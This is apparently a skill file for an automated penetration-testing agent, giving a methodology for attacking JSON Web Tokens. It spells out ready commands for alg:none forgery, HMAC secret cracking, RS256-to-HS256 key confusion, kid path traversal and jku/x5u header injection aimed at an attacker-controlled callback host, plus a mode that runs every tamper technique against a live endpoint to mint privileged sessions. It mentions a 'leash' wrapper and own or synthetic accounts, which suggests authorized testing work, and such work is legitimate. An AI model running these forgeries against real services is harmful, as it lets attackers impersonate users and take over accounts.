---
name: attack-jwt
description: JWT attacks — alg:none, RS/HS key confusion, weak-secret cracking, and kid/jku header injection to forge a trusted token.
category: web-application
tags: [jwt, auth, token, signature, forgery]
cwe_ids: [CWE-347, CWE-287]
chains_with: [attack-auth-bypass, attack-idor, oob-interactsh]
tools: [jwt-hack, jwt_tool, interactsh-client, curl]
version: "1.1"
---

# JWT attacks

## Objective
Forge or alter a JSON Web Token the server **accepts as valid** and use it to reach an identity or
action you are not entitled to — proven by the protected response, before/after the swap. Replays go
through the leash: `tools/leashed.sh $T bin/<tool> …` (`$T` = target dir).

## Methodology
1. **Decode & profile.** `bin/jwt-hack decode "$JWT"` — read `alg`, `kid`, `jku`/`x5u`, and the
   claims that gate access (`role`, `sub`, `admin`, `iss`). Decide which claim to tamper.
2. **alg:none.** Generate the unsigned variants with `bin/jwt-hack payload "$JWT"` (none/None/NONE,
   empty signature). Replay each against a protected endpoint through the leash; acceptance = forgery.
3. **Weak secret (HMAC).** Crack the signing key: dictionary
   `bin/jwt-hack crack -w wordlists/jwt.txt "$JWT"`, or brute `bin/jwt-hack crack -m brute --max 5 "$JWT"`.
   On a hit, re-sign a privileged claim with `bin/jwt-hack encode --secret "<cracked>" '<claims-json>'`.
4. **Key confusion (RS256→HS256).** Fetch the public key (JWKS/cert), then sign an HS256 token using
   that public key **as the HMAC secret**: `bin/jwt-hack encode --secret "$(cat pub.pem)" '<claims>'`.
   If the server verifies HS256 with its RSA public key, the token validates.
5. **kid / jku / x5u injection.** Point `kid` at a file you control or an SQLi/path-traversal value
   (chain to `attack-sqli`); point `jku`/`x5u` at your JWKS. Route the header URL at an interactsh
   host (`bin/interactsh-client -json -o raw/jwt/oob.jsonl`, see `oob-interactsh`) — a callback proves
   the server fetched attacker-controlled keys; serve a matching key to forge a fully-signed token.
6. **Full automation with `jwt_tool`** (beyond jwt-hack's crack/none scope). `jwt_tool` weaponizes the
   header-injection set jwt-hack can't and replays live against the endpoint for the oracle:
   - alg-confusion: `tools/leashed.sh $T bin/jwt_tool "$JWT" -X k -pk pub.pem` (RS256→HS256 with the
     scraped public key → forge any identity).
   - header injections: `-X i` (inject/modify claims), `-I -hc kid -hv "../../dev/null"` (kid traversal),
     `-X s` (jku/x5u spoof at your JWKS).
   - live exploit + oracle: `-M at -t "$URL" -rc "<cookie>"` runs all tamper modes against the target and
     reports which forged token the server ACCEPTS — the acceptance is the proof. Always through the leash,
     own/synthetic accounts only.
   A forged token that mints a privileged session provides `session:<host>`/`foothold:<host>` for the scheduler.

## What counts as a finding
- **Critical/High:** a forged token the server accepts that grants a protected identity/action —
  admin claim honored, another user impersonated. Weak-secret crack that lets you mint any token = high.
- **Lead only:** `alg:none`/tamper is rejected, or acceptance yields no privilege change. An accepted
  token with no boundary crossed is a `[UNCONFIRMED CANDIDATE]` (see `poc-standard`).

## Evidence
Under `raw/jwt/`: the original and forged tokens (decoded header+claims), the exact replay request,
the protected response before vs after the swap, any interactsh callback line, and a runnable PoC.
All target-facing HTTP goes through `tools/leashed.sh`.
